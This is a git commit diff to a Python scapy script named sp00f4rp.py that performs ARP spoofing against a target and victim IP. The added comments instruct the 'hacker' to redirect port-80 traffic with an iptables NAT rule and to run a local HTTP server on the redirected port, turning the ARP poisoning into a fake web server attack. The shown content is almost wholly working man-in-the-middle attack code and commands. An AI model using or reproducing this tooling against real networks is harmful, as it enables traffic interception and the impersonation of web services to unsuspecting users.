09e83dab05b88fba6da2c7019173da650c00415b
P4ti3nn3 <115619908+P4ti3nn3@users.noreply.github.com>
2023-12-05 16:22:32 +0100

    Update sp00f4rp.py

--- Scr1pts/sp00f4rp.py
+++ Scr1pts/sp00f4rp.py
@@ -4,7 +4,15 @@ from scapy.all import *
 ip_target = "X.X.X.X"
 ip_victim = "X.X.X.X"
 
-
+#to spoof an http serv :
+#
+#on hacker:
+#
+#iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 6673
+#
+#and 
+#
+#python3 -m http.server 6673
 
 def spoffing(target, victim):
     packet = ARP(op=2, pdst=target, psrc=victim)
